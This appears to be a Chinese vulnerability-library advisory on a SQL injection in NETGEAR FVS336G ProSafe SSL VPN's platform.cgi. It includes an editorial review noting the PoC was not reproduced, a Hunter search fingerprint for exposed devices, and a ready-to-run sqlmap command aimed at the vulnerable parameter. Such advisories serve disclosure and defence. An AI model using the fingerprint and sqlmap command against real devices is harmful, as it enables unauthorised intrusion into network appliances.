---
source: "wy876 漏洞文库"
id: "vw-280fe45cdea6bafca84d5b89"
entity_id: "ve-280fe45cdea6bafca84d5b89"
schema_version: "1"
fofa_unverified: "app.name=="
title: "NETGEAR ProSafe SSL VPN SQL注入（CNNVD-202205-3298）"
product: "NETGEAR FVS336Gv2/v3 ProSafe SSL VPN"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CNNVD-202205-3298"
referenced_identifiers: ""
prerequisites: "固件未列；登录表单与认证状态未说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/NETGEAR/NETGEARProSafeSSLVPNSQL%E6%B3%A8%E5%85%A5%EF%BC%88CNNVD-202205-3298%EF%BC%89.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mvw70mskzp0yhtyf"
source_status: "recorded"
---

# NETGEAR ProSafe SSL VPN SQL注入（CNNVD-202205-3298）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：NETGEAR FVS336Gv2/v3 ProSafe SSL VPN
- 本文讨论：CNNVD-202205-3298 USERDBDomains.Domainname SQL注入
- 版本、权限与配置前提：固件未列；登录表单与认证状态未说明
- 资料类型：SQL注入工具命令摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 简介cgi-bin与请求scgi-bin路径不同
- 仅sqlmap命令无注入请求/响应/数据库结果，不能直接支撑进而控制系统
- --form参数需按所用工具版本核对标准--forms；元数据仅残缺Hunter字段
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- CNNVD对应CVE/固件与RCE延伸待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
NETGEAR FVS336G是美国网件（NETGEAR）公司的一款VPN（虚拟私人网络）防火墙路由器。NETGEAR ProSafe SSL VPN firmware FVS336Gv2 和FVS336Gv3版本存在安全漏洞，该漏洞源于cgi-bin/platform.cgi中的USERDBDomains.Domainname参数缺少过滤转义。攻击者可利用该漏洞进行SQL注入攻击，进而控制系统。

# 二、影响版本
+ NETGEAR ProSafe SSL VPN 

# 三、资产测绘
+ hunter`app.name=="NETGEAR ProSAFE"`
+ 特征


# 四、漏洞复现
**sqlmap **

```plain
sqlmap -u "https://xx.xx.xx.xx/scgi-bin/platform.cgi" --form  -p USERDBDomains.Domainname --batch
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mvw70mskzp0yhtyf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
